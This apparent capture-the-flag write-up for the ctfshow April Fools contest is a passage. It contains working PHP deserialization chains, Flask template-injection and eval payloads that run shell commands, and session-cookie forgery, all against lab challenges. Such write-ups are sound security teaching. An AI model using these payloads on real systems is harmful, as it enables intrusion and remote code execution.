## ctfshow【愚人杯】

### web

#### easy_signin            

打开发现：url

```
http://b96d3820-fc5d-4c61-9007-68ae2b60a743.challenge.ctf.show/?img=aW5kZXgucGhw
```

img参数被base64编码，解码后发现是`face.png`

于是我们想到，可以将index.php进行base64编码，使用get传参

![image-20230403232405829](https://raw.githubusercontent.com/leekosss/photoBed/master/202304032324899.png)

图片路径base64解压得到flag





#### 被遗忘的反序列化

```php
<?php

# 当前目录中有一个txt文件哦
error_reporting(0);
show_source(__FILE__);
include("check.php");

class EeE{
    public $text;
    public $eeee;
    public function __wakeup(){
        if ($this->text == "aaaa"){
            echo lcfirst($this->text);
        }
    }

    public function __get($kk){
        echo "$kk,eeeeeeeeeeeee";
    }

    public function __clone(){
        $a = new cycycycy;
        $a -> aaa();
    }
    
}

class cycycycy{
    public $a;
    private $b;

    public function aaa(){
        $get = $_GET['get'];
        $get = cipher($get);
        if($get === "p8vfuv8g8v8py"){
            eval($_POST["eval"]);
        }
    }


    public function __invoke(){
        $a_a = $this -> a;
        echo "\$a_a\$";
    }
}

class gBoBg{
    public $name;
    public $file;
    public $coos;
    private $eeee="-_-";
    public function __toString(){
        if(isset($this->name)){
            $a = new $this->coos($this->file);
            echo $a;
        }else if(!isset($this -> file)){
            return $this->coos->name;
        }else{
            $aa = $this->coos;
            $bb = $this->file;
            return $aa();
        }
    }
}   

class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }else{
            echo "不行哦";
        }
    }

    public function __destruct(){
        echo $this->aaa;
    }

    public function __invoke(){
        $this -> aaa = clone new EeE;
    }
}

$_ip = $_SERVER["HTTP_AAAAAA"];
unserialize($_ip);
```



我们观察到：`$_SERVER["HTTP_AAAAAA"]` ，意思是我们需要在header头中传入名为`AAAAAA`的头，进行传参

首先我们看到类 `cycycycy`：

```php
class cycycycy{
    public $a;
    public function aaa(){
        $get = $_GET['get'];
        $get = cipher($get);
        if($get === "p8vfuv8g8v8py"){
            eval($_POST["eval"]);
        }
    }
}
```

这里可以进行代码执行，但是我们并不知道`cipher()`函数是什么，并且需要使get传参后的值经过cipher加密后为：`p8vfuv8g8v8py`，`cipher()`应该是在`check.php`中



然后我们注意到类 `w_wuw_w`：

```php
class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }
    }
}
```

这里存在文件包含漏洞，于是我们想要去读取`check.php`，构造：

```php
<?php
class w_wuw_w
{
    public $aaa;
    public $key;
    public $file;


}
$a = new w_wuw_w();
$a->file = "php://filter/convert.base64-encode/resource=check.php";
$a->aaa=&$a->key;
echo serialize($a);

输出：
O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";R:2;s:4:"file";s:53:"php://filter/convert.base64-encode/resource=check.php";}
```

这里我们让 `$aaa`去指向`$key`的那片内存空间，这样我们就能通过$aaa去输出读取到的文件内容了，

![image-20230408170131757](https://raw.githubusercontent.com/leekosss/photoBed/master/202304081701840.png)

base64解密，得到`check.php`内容：

```php
<?php

function cipher($str) {

    if(strlen($str)>10000){
        exit(-1);
    }

    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
    $shift = 4;
    $shifted = "";

    for ($i = 0; $i < strlen($str); $i++) {
        $char = $str[$i];
        $pos = strpos($charset, $char);

        if ($pos !== false) {
            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);
            $shifted .= $charset[$new_pos];
        } else {
            $shifted .= $char;
        }
    }

    return $shifted;
}
```

这里定义了 `cipher()`函数，我们写一个解密脚本：

```php
<?php
function uncipher($str) {
    $charset = "qwertyuiopasdfghjklzxcvbnm123456789";
    $shift = 4;
    $shifted = "";

    for ($i = 0; $i < strlen($str); $i++) {
        $char = $str[$i];
        $pos = strpos($charset, $char);

        if ($pos !== false) {
            $new_pos = $pos + $shift - strlen($charset);

            $shifted .= $charset[$new_pos];
        } else {
            $shifted .= $char;
        }
    }

    return $shifted;
}
echo uncipher("p8vfuv8g8v8py");
```

得到 get= `fe1ka1ele1efp`

然后我们根据`cycycycy->aaa()`可以反推出一条pop链：

```php
w_wuw_w->destruct()  =>  gBoBg->toString()  =>  w_wuw_w->__invoke()
=>  EeE->__clone()  =>  cycycycy->aaa()
```

于是我们如下构造：

```php
<?php
class gBoBg{
    public $name;
    public $file;
    public $coos;

}

class w_wuw_w{
    public $aaa;
    public $key;
    public $file;

}
$w = new w_wuw_w();
$g = new gBoBg();
$w->aaa = $g;
$g->file = "abc";
$g->coos = $w;
echo serialize($w);

输出：
O:7:"w_wuw_w":3:{s:3:"aaa";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:3:"abc";s:4:"coos";r:1;}s:3:"key";N;s:4:"file";N;}
```

然后我们传参进行代码执行即可：

![image-20230408171121787](https://raw.githubusercontent.com/leekosss/photoBed/master/202304081711847.png)







#### easy_ssti            

打开后查看源码，提示`app.zip`，于是我们下载下来，得到源码：

app.py

```python
from flask import Flask
from flask import render_template_string,render_template
app = Flask(__name__)

@app.route('/hello/')
def hello(name=None):
    return render_template('hello.html',name=name)
@app.route('/hello/<name>')
def hellodear(name):
    if "ge" in name:
        return render_template_string('hello %s' % name)
    elif "f" not in name:
        return render_template_string('hello %s' % name)
    else:
        return 'Nonononon'
```

观察一下，`render_template_string('hello %s' % name)` 中模板内容可以由参数传入，所以构成了`python flask SSTI模板注入`

我们观察一下，发现想要注入，

参数必需包含：`ge`，如果不包含就不能有`f`

所以我们就可以去构造我们的payload



##### 本人解法

```python
{{''.__class__.__base__.__subclasses__().__getitem__['catch_warnings'].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cd ..;cat flag").read()')}}
```

首先我们先通过 `''.__class__`获取到：字符串的类型

然后 `__base__`获取到字符串的基类(Object，python中对象基类都是Object)

`__subclasses__()`函数获取到Object类的所有子类，返回一个列表

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032349225.png" alt="image-20230403234955145" style="zoom: 33%;" />

> `catch_warnings`是warnings下的一个模块，当有报错提示时说明导入了此类

由于题目需要我们包含`ge`，所以我们可以使用 `__getitem__[]`特殊方法

获取给定键对应的值

然后我们再使用`__init__` 初始化`catch_warnings`类，

再使用`__globals__`，获取全局模块可读的属性、值

![image-20230404000356404](https://raw.githubusercontent.com/leekosss/photoBed/master/202304040003579.png)

然后我们使用`__builtins__`，这个里面可以利用到 eval

![image-20230404000751744](https://raw.githubusercontent.com/leekosss/photoBed/master/202304040007847.png)

然后我们使用eval，popen进行命令执行：

```python
['eval']('__import__("os").popen("cd ..;cat flag").read()')
```

得到flag



##### 官方解法：

```python
/hello/{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("ctfshow")).read()}}?ctfshow=cat /flag 
```

使用 `__subclasses__()[132]`获得第132位的类，即：`<class 'os._wrap_close'>`，os

然后 `__init__.__globals__['popen']` 初始化后调用`popen`，

但是此处使用 `request.args.get("ctfshow")`，意思是通过get传参传进来命令





#### easy_flask

注册后看到如下界面，看样子就是要进行身份伪造越权

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040019918.png" alt="image-20230404001951846" style="zoom: 33%;" />

我们查看一下部分源码

app.py

```python
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response

app = Flask(__name__)


app.secret_key = 'S3cr3tK3y'  # 这里是关键点

users = {

}

@app.route('/')
def index():
# Check if user is loggedin
if 'loggedin' in session:
return redirect(url_for('profile'))
return redirect(url_for('login'))

@app.route('/login/', methods=['GET', 'POST'])
def login():
msg = ''
if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
username = request.form['username']
password = request.form['password']
if username in users and password == users[username]['password']:
session['loggedin'] = True
session['username'] = username
session['role'] = users[username]['role']
return redirect(url_for('profile'))
else:
msg = 'Incorrect username/password!'
return render_template('login.html', msg=msg)


@app.route('/register/', methods=['GET', 'POST'])
def register():
msg = ''
if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
username = request.form['username']
password = request.form['password']
if username in users:
msg = 'Account already exists!'
else:
users[username] = {'password': password, 'role': 'user'}
msg = 'You have successfully registered!'
return render_template('register.html', msg=msg)



@app.route('/profile/')
def profile():
if 'loggedin' in session:
return render_template('profile2.html', username=session['username'], role=session['role'])
return redirect(url_for('login'))

........
```

这里源码中的密钥很可疑，网站使用flask框架

用bp抓个包

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040022371.png" alt="image-20230404002223291" style="zoom: 33%;" />

这里cookie中存在一个session，因此我们断定这是`flask session伪造`

我们使用工具：`flask_session_cookie_manager`

![image-20230404002709895](https://raw.githubusercontent.com/leekosss/photoBed/master/202304040027945.png)

先解码一下，然后把`user`换成`admin`再编码一下

![image-20230404002805939](https://raw.githubusercontent.com/leekosss/photoBed/master/202304040028988.png)

得到了伪造后的session，然后我们再发送给服务器：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040029129.png" alt="image-20230404002936045" style="zoom: 33%;" />

发现一个下载按钮，下载后得到一个假的flag，

此处存在任意文件下载漏洞，我们下载的时候抓包，将filename改为app.py获取源码

![image-20230404003125830](https://raw.githubusercontent.com/leekosss/photoBed/master/202304040031891.png)

app.py

```python
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response


app = Flask(__name__)


app.secret_key = 'S3cr3tK3y'

users = {
    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}
}



@app.route('/')
def index():
    # Check if user is loggedin
    if 'loggedin' in session:
        return redirect(url_for('profile'))
    return redirect(url_for('login'))

@app.route('/login/', methods=['GET', 'POST'])
def login():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users and password == users[username]['password']:
            session['loggedin'] = True
            session['username'] = username
            session['role'] = users[username]['role']
            return redirect(url_for('profile'))
        else:
            msg = 'Incorrect username/password!'
    return render_template('login2.html', msg=msg)


@app.route('/register/', methods=['GET', 'POST'])
def register():
    msg = '' 
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users:
            msg = 'Account already exists!'
        else:
            users[username] = {'password': password, 'role': 'user'}
            msg = 'You have successfully registered!'
    return render_template('register2.html', msg=msg)



@app.route('/profile/')
def profile():
    if 'loggedin' in session:
        return render_template('profile2.html', username=session['username'], role=session['role'])
    return redirect(url_for('login'))


@app.route('/show/')
def show():
    if 'loggedin' in session:
        return render_template('show2.html')

@app.route('/download/')
def download():
    if 'loggedin' in session:
        filename = request.args.get('filename')
        if 'filename' in request.args:              
            return send_file(filename, as_attachment=True)
  
    return redirect(url_for('login'))


@app.route('/hello/')
def hello_world():
    try:
        s = request.args.get('eval')
        return f"hello,{eval(s)}"
    except Exception as e:
        print(e)
        pass
        
    return "hello"
    

@app.route('/logout/')
def logout():
   session.pop('loggedin', None)
   session.pop('id', None)
   session.pop('username', None)
   session.pop('role', None)
   return redirect(url_for('login'))


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

```

这里存在代码漏洞，我们直接读根目录：

```python
eval=__import__("os").popen("ls /").read()
```

![image-20230404003724365](https://raw.githubusercontent.com/leekosss/photoBed/master/202304040037458.png)

然后查看flag：

```python
eval=__import__("os").popen("cat /flag_is_h3re").read()
```





#### easy_php

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }
}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}

```

分析一下代码，首先，我们需要知道，怎么进行get传参：`$_GET['1+1>2']`

我们做一个小实验：

```php+HTML
<?php
echo print_r($_GET);
```

如果我们直接传参：`1+1>2`

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041430509.png" alt="image-20230404143039437" style="zoom:33%;" />

可以发现，`+加号`被替换为了`下滑线_`，但是我们将加号替换为url编码：`%2B`

发现就可以了：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041432688.png" alt="image-20230404143238634" style="zoom:33%;" />

我们观察一下这个正则：

```php
if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}
```

如果序列化后的串是以O或者A开头，即对象或数组的话，就不行。

本来想的是使用数值前弄一个加号绕过的，但是反序列化的时候没用

看了wp后，发现使用了一个内置类：`ArrayObject`

我们可以将对象传入`ArrayObject`对象的构造方法中，然后序列化一下，进行绕过

```php
<?php

class ctfshow
{
    public $ctfshow;
}
$c = new ctfshow();
$c->ctfshow="ls /";

echo serialize(new ArrayObject($c));
```

```php
输出：
C:11:"ArrayObject":58:{x:i:0;O:7:"ctfshow":1:{s:7:"ctfshow";s:4:"ls /";};m:a:0:{}}
```

传参：

![image-20230404144648994](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041446078.png)

（注意看，这里还是使用了`__wakeup()`，但是程序并没有结束，可能是有某些错误造成程序还在执行）

然后得flag

```php
C:11:"ArrayObject":67:{x:i:0;O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";};m:a:0:{}}
```







### misc

#### 奇怪的压缩包

下载后得到zip压缩包，我们把两处改为00即可

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040042504.png" alt="image-20230404004242381" style="zoom: 33%;" />

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040043253.png" alt="image-20230404004328215" style="zoom:50%;" />

然后在png图片结尾发现一串key：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040044863.png" alt="image-20230404004429821" style="zoom:50%;" />

解压后得到：

```
yurenjie
```

我们在图片中发现zip文件：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040047362.png" alt="image-20230404004703316" style="zoom:33%;" />

使用foremost分离一下，得到zip，解密密码：`yurenjie`

得到一张crc不匹配的图片，改一下高度即可

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040048484.png" alt="image-20230404004840396" style="zoom:33%;" />



#### 哇库哇库2

下载后得到压缩包，密码如下：

> 阿尼亚会高数: 哇库哇库！
>
> 1. key = Σ(1/(n!))
> 2. "Σ(1/(n!))"为无穷级数
> 3. 结果四舍五入保留十二位有效数字

我们写个脚本：

```python
# 密码
def main(num):
    a = 1
    for x in range(1, num + 1):
        a = a * x
    return a


total = 0
for i in range(1, 100):
    m = 1 / main(i)
    total = total + m
    print("%.11f" % (total+1))
    
密码：2.71828182846
```

然后打开docx文件：

![image-20230404110449487](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041104645.png)

对比原字幕，发现多了标点符号：`。？！`，有点像`简化版的Ook编码`(只有`!.?`)

我们将 `。？！`替换为英文的`.?!`

然后替换掉换行符，变成一行字符串，如果字符是：`.?!`，直接输出

```python
# coding=gbk
import re
import string

print('Start!')

# f=open('flag.txt','r', encoding = 'UTF-8')

# string = f.read()

string = '阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.好帅好帅!阿尼亚棒吗?可爱,可爱!阿尼亚不想去上学了!阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?交给我吧!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.阿尼亚好兴奋!阿尼亚可爱吗?阿尼亚要加油!阿尼亚在学校也会加油的!好想有个母亲爱我.阿尼亚帅不帅?阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.哇酷哇酷?阿尼亚必须加油!我想永远和他们在一起.阿尼亚棒吗?父亲做菜很好吃.多亏了父亲.营救公主的间谍!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.是住在城堡里的奇美拉!阿尼亚帅不帅?救命呀!救救我！劳埃德曼!好想有个母亲爱我.蓬蓬头?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!哇酷哇酷?阿尼亚喜欢厉害又帅气的母亲.阿尼亚棒吗?太好了!都怪阿尼亚踩到了粑粑.阿尼亚可爱吗?花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚一点也不在意.阿尼亚帅不帅?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚在学校也会加油的!蓬蓬头?阿尼亚必须加油!营救公主的间谍!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚可爱吗?是住在城堡里的奇美拉!阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚帅不帅?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.救命呀!父亲和母亲甜甜蜜蜜.蓬蓬头?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.救救我！劳埃德曼!哇酷哇酷?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!要是不向次子道歉,世界和平就完蛋了.阿尼亚棒吗?看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚可爱吗?欢迎来到阿尼亚家.阿尼亚帅不帅?阿尼亚想吃蛋包饭!阿尼亚想穿这身衣服出萌.蓬蓬头?警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.交给我吧!多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.父亲,阿尼亚合格啦!会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚好兴奋!阿尼亚想穿这身衣服出萌.哇酷哇酷?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.阿尼亚要加油!阿尼亚棒吗?阿尼亚在学校也会加油的!阿尼亚必须加油!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?可爱,可爱!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.父亲,母亲,有需要帮助的人!阿尼亚可爱吗?要帮助他!太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.蓬蓬头?母亲是杀手.哇酷哇酷?花生!父亲和母亲甜甜蜜蜜.阿尼亚棒吗?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.阿尼亚想吃蛋包饭!父亲是间谍.警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!母亲是杀手.阿尼亚可爱吗?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.营救公主的间谍!阿尼亚帅不帅?是住在城堡里的奇美拉!救命呀!欢迎来到阿尼亚家.蓬蓬头?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.哇酷哇酷?阿尼亚不想要这个妈妈.阿尼亚棒吗?救救我！劳埃德曼!父亲是间谍.阿尼亚可爱吗?阿尼亚好想看呀!母亲是杀手.阿尼亚帅不帅?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.完美的劳埃德曼,好想看呀!蓬蓬头?看我必杀拳,砰!好耶!欢迎来到阿尼亚家.哇酷哇酷?父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚棒吗?阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?可爱,可爱!阿尼亚想去你家玩.阿尼亚帅不帅?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!阿尼亚从孤儿院出来以后,遇到了好多开心的事.太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!阿尼亚好失落.蓬蓬头?好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.好帅好帅!哇酷哇酷?可爱,可爱!阿尼亚不想去上学了!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚棒吗?交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚可爱吗?我想永远和他们在一起.阿尼亚帅不帅?救命呀!父亲做菜很好吃.蓬蓬头?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!多亏了父亲.哇酷哇酷?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚想吃蛋包饭!阿尼亚棒吗?警惕!阿尼亚想像母亲一样厉害!阿尼亚喜欢厉害又帅气的母亲.阿尼亚可爱吗?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.阿尼亚帅不帅?我想永远和他们在一起.蓬蓬头?好帅好帅!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.可爱,可爱!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚不想去上学了!阿尼亚可爱吗?交给我吧!父亲,阿尼